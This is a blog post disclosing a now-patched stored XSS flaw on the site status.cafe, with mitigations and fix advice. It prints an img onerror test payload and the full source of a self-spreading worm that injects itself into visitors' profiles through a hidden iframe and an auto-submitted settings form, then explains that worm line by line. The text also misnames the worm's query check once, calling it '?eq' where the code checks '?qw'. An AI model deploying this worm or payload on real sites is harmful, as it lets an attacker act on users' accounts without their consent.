---
layout: '../../../layouts/PostLayout.astro'
title: 'XSS on Status Cafe: What you need to know'
published: 06/16/2025 23:00
description: As these kinds of vulnerabilities should be fixed, I think this post might give you an insight of how does this vulnerability affects you if you're using status.cafe.
tags: vulnerability, xss, status-cafe
background: '/imgs/posts/status-cafe-xss/image.png'
---

> <p class="text-xs">Update 06/18/2025</p>
>
> ## Patched
> The vulnerability has been patched by sanitizing user input.
> **This is huge.** Even though the worm is still lingering out there, I'm glad that it won't infect other people and future worm attempts will be difficult to do.

Hey there! [Status Cafe](https://status.cafe/) is a status-posting site where users can share their status for anyone can see, and it's popular among indie web developers as it's easy to use it for posting your own status and embedding it on your site.

Each user has their own page that shows their status history and whatnot. It contains some things, like your profile image, a "Subscribe via Atom" link, your homepage, email, and an about me section.

![My status cafe profile page](/imgs/posts/status-cafe-xss/image2.png)

But there's another thing, the about me section accepts HTML and CSS! Most people uses it for like styling their page, and like removing unnecessary things.

![A styled status cafe profile page (from rice.place)](/imgs/posts/status-cafe-xss/image3.png)

There's also some people that makes their status cafe profile page look distinct from other sites by using CSS to remove things and readding it with HTML, like me!

![my jbsite4-themed status cafe profile page](/imgs/posts/status-cafe-xss/image4.png)

But, the thing it doesn't support is JavaScript. Adding script tags on it will result to this:

![a page saying <script> tags is forbidden](/imgs/posts/status-cafe-xss/image5.png)

But, it **should** sanitize user input and remove any mentions of JS, right? *right???*

Script tags are blocked, but what about some workarounds? Let's try the classic img tag onerror XSS trick... and it worked.

![an alert window saying 'xss'](/imgs/posts/status-cafe-xss/image6.png)

That means that it's not sanitizing event handler based scripts, which lead into the status.cafe worm.

# Things you need to know
> 🗒️ Before I say anything else, I will say that your status cafe token is not sent into an attacker, and they can't do it. That's because the token cookie uses HttpOnly as it should.
> This means that **no account has been stolen**.

The XSS vulnerability uses [HTML event handler attributes](https://developer.mozilla.org/en-US/docs/Learn_web_development/Core/Scripting/Events#inline_event_handlers_%E2%80%94_dont_use_these), which usually is frowned upon as they are outdated and will result on messy code, but the indie web still uses these *(that's why MDN says to not use these)*.

What does that mean? It means that an attacker can run scripts on your browser without you knowing, which is bad when executed properly.

## Technical Info
Status Cafe doesn't fully sanitize user input, which leads on this vulnerability.

If you include a code like this on your about page:
```html
<img src="x" onerror="alert('XSS')">
```

It will not sanitize `onerror`, which is really bad for a reason.

## What can attacker do with this?
There are things an attacker can do with this, even though they can't get your cookie:
- Post statuses on your behalf
- Change your profile info
- Make a browser do things you didn't do
- Change things you see on the site
- *and many more...*

## Mitigation
For now, you can use this uBlock Origin custom filter rule to block scripts on user pages:
```
||*status.cafe/users/*$csp=script-src 'none'
```

You can also disable JS on the entire site, which I think works fine as status.cafe works primarily out of HTML form elements.

## What should Status Cafe do?
- Sanitize user input. It already somewhat sanitizes input (like \<script\> tags is not allowed) but a full sanitization of user input is better than a half-baked one, as this worm uses inline event handlers (like onload or onerror)
- Implement better Content-Security-Policy headers (like preventing inline scripts from running on user pages) to prevent other XSS misuse.
- Implement better CORS to prevent scripts from fetching user settings for example
- Make it so the settings pages and such to block being able to load in iframes. This can be implemented by using X-Frame-Options or the Content-Security-Policy headers.

# One more thing - Status Cafe Status Widget Self-XSS 
This is also related on XSS but it's much different than the other one, but the first vulnerability can post this on your profile and make your site have a vulnerability, but this is much harder to do without being noticed.

This is because the widget uses innerHTML, and it just putting user status without sanitizing it, which is also bad. It's reasonable to use innerHTML for this as status.cafe also have automatic link handling for example.

# Extra - Looking at the Status Cafe worm
> 🗒️ I'm going to be a bit technical about this.

The worm code looks like this at it's raw:
```html
<img src="x" style="display:none;" onerror="/*the silly worm*made by ???*should probably not infect the same person twice*also pls dont remove js, i think it'd be cool to keep it so that it allows funny stuff like this to happen*xoxo and merry christmas*  -???*/(async()=>{if(document.location.search=='?qw'){const d=new DOMParser().parseFromString(await(await fetch('https://status.cafe/settings')).text(),'text/html');if(!d||d.querySelector('textarea')?.outerHTML.includes('&amp;'+'lt;!--javaistrash--&amp;'+'gt;')){throw 0};d.querySelector('textarea').innerText+='\n<!--javaistrash-->';d.querySelector('textarea').innerText+='\n'+this.outerHTML;d.querySelector('form').id='123';document.body.append(d.querySelector('form'));document.getElementById('123').querySelector('input[type=submit]').click()}else{const nu=new window.URL(document.location.href);nu.search='?qw';const f=document.createElement('iframe');f.setAttribute('style','display:none;');f.setAttribute('src',nu.href);document.body.append(f)}})()">
```

Quite long, isn't it? Let's remove the unnecessary code and beautify it:
```js
(async () => {
    if (document.location.search == '?qw') {
        const d = new DOMParser().parseFromString(await (await fetch('https://status.cafe/settings')).text(), 'text/html');
        if (!d || d.querySelector('textarea')?.outerHTML.includes('&amp;' + 'lt;!--javaistrash--&amp;' + 'gt;')) {
            throw 0
        };
        d.querySelector('textarea').innerText += '\n<!--javaistrash-->';
        d.querySelector('textarea').innerText += '\n' + this.outerHTML;
        d.querySelector('form').id = '123';
        document.body.append(d.querySelector('form'));
        document.getElementById('123').querySelector('input[type=submit]').click()
    } else {
        const nu = new window.URL(document.location.href);
        nu.search = '?qw';
        const f = document.createElement('iframe');
        f.setAttribute('style', 'display:none;');
        f.setAttribute('src', nu.href);
        document.body.append(f)
    }
})()
```

The code is wrapped into an [IIFE](https://developer.mozilla.org/en-US/docs/Glossary/IIFE), which makes it run almost immediately and with async support.

It looks for an `?eq` search string on the URL and runs 2 different things if there is one or if there is none:

## If there is one
```js
// Fetches the status cafe settings, and parses it using DOMParser
const d = new DOMParser().parseFromString(await (await fetch('https://status.cafe/settings')).text(), 'text/html');

// Looks if there's already an instance of the worm, and if so, throws an error with content `0`
if (!d || d.querySelector('textarea')?.outerHTML.includes('&amp;' + 'lt;!--javaistrash--&amp;' + 'gt;')) {
    throw 0
};

// appends <!--javaistrash-->, which makes the above work
d.querySelector('textarea').innerText += '\n<!--javaistrash-->';

// then it appends the script itself
d.querySelector('textarea').innerText += '\n' + this.outerHTML;

// then it changes ids
d.querySelector('form').id = '123';

// then it appends it on the iframe
document.body.append(d.querySelector('form'));

// and clicks the submit button, which makes it infect your profile with the worm
document.getElementById('123').querySelector('input[type=submit]').click();
```

## If there is none
```js
// Evaluates the current URL
const nu = new window.URL(document.location.href);

// adds ?qw on it
nu.search = '?qw';

// then it creates an iframe
const f = document.createElement('iframe');

// then it sets itself to display: none, which makes it invisible to the user vising the page
f.setAttribute('style', 'display:none;');

// then it sets the src of the iframe
f.setAttribute('src', nu.href);

// and finally, it appends the iframe into the body
document.body.append(f);
```

# Timeline
- **2023-07-12** - disclosed by divsel in the [status.cafe forums](https://forum.status.cafe/topics/74)
- **2025-04-23** - first report of an worm being spread into status.cafe
- **2025-05-22** - emailed status.cafe developer about it, for an update
- **2025-06-16** - public disclosure
- **2025-06-18** - issue patched

# Wrap-up
Although this would not compromise your status.cafe account, you should be still wary of visiting other people's user pages while this hasn't been fixed yet.

Also, I recommend following the [mitigation steps](#mitigation) above, which makes your browser almost immune on the worm.